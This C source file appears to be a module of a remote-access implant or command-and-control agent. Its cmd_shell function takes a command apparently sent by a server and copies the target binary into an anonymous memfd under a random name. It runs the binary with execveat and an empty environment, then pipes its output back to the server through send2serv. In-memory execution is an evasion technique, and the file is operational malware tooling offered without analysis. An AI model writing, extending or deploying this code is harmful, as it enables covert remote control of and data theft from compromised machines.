#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include "functions/send/send2serv.h"
#include "functions/connection/connection.h"
#include "functions/split/split.h"

void cmd_shell(request_t *req, int sockfd, const profile_t *profile, const char *input) {

    srand(time(NULL));
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
    int charset_len = strlen(charset);

    int name_len = 6 + 1;
    char name[name_len + 1];
    for (int i = 0; i < name_len; i++) {
        int name_index = rand() % charset_len;
        name[i] = charset[name_index];
    }
    char *cp_input = strdup(input);
    char **args = split(cp_input, ' ', 150);
    char *command = args[0];

    name[name_len] = '\0';
    char *const envp[] = {NULL};


    char full_path[1024];
    bool found_path = false;

    if (strchr(command, '/') != NULL) {
        if (access(command, R_OK) == 0) {
            snprintf(full_path, sizeof(full_path), "%s", command);
            found_path = true;
        }
    } else {
        char *path = getenv("PATH");
        if (path) {
            char *path_copy = strdup(path);
            char *dir = strtok(path_copy, ":");
            while (dir != NULL) {
                snprintf(full_path, sizeof(full_path), "%s/%s", dir, command);
                if (access(full_path, R_OK) == 0) {
                    found_path = true;
                    break;
                }
                // Get the next directory in the PATH.
                dir = strtok(NULL, ":");
            }
            free(path_copy);
        }
    }

    if (!found_path) {
        char *message = "ERROR: Command binary not found or error executing command";
        send2serv(req, profile, message, strlen(message));
        free(args); // Clean up memory from split
        return;     // Stop execution
    }

    // Create a pipe
    int pipefd[2];
    if (pipe(pipefd) == -1) {
        return;
    }

    // Fork child process
    pid_t pid = fork();
    if (pid == -1) {
        return;
    }

    if (pid == 0) {
        close(pipefd[0]);
        dup2(pipefd[1], STDOUT_FILENO);
        dup2(pipefd[1], STDERR_FILENO);

        int fd = open(full_path, O_RDONLY);
        if (fd == -1) return;
        
        struct stat st;
        int rv = fstat(fd, &st);

        if (rv == -1) return;

        void *buffer = malloc(st.st_size); //size of binary
        if (buffer == NULL) return;

        ssize_t bytesRead = read(fd, buffer, st.st_size);
        if (bytesRead == -1) return;

        close(fd);
        int af = memfd_create(name, MFD_CLOEXEC);
        if (af == -1) return;
        
        ssize_t bytesWritten = write(af, buffer, st.st_size);
        if (bytesWritten == -1) return;

        execveat(af, "", args, envp, AT_EMPTY_PATH);
        
        return;
    } else {
        close(pipefd[1]);
        
        char *output_buffer = NULL;
        size_t total_size = 0;
        char read_chunk[4096];
        ssize_t bytes_read;

        while ((bytes_read = read(pipefd[0], read_chunk, sizeof(read_chunk))) > 0) {
            output_buffer = realloc(output_buffer, total_size + bytes_read);

            if (output_buffer == NULL) {
                // Handle memory allocation error
                perror("realloc failed");
                break; 
            }

            memcpy(output_buffer + total_size, read_chunk, bytes_read);
            total_size += bytes_read;
        }
        send2serv(req, profile, output_buffer, total_size);
        free(output_buffer);
    }
    free(args);
    close(pipefd[0]);
    waitpid(pid, NULL, 0);
}